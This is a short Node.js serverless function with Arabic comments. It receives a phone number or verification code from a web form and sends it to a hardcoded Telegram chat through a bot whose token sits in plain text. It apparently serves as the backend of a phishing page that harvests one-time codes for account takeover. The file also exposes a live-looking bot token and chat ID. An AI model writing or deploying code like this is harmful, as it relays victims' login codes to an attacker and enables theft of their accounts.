const https = require("https");

// التوكن والـ Chat ID مخفي داخل الدالة
const BOT_TOKEN = "7437511281:AAGci7pReIeb7lGGZEIB1M42hEtFLIxsrjk";
const CHAT_ID  = "6415523731";

exports.handler = async function(event, context) {
  try {
    const body = JSON.parse(event.body);
    const message = body.phone || body.code; // استقبال رقم الهاتف أو كود التحقق

    const data = JSON.stringify({ chat_id: CHAT_ID, text: message });

    const options = {
      hostname: "api.telegram.org",
      port: 443,
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": data.length
      }
    };

    await new Promise((resolve, reject) => {
      const req = https.request(options, res => {
        res.on("data", () => {});
        res.on("end", resolve);
      });
      req.on("error", reject);
      req.write(data);
      req.end();
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: err.message })
    };
  }
};
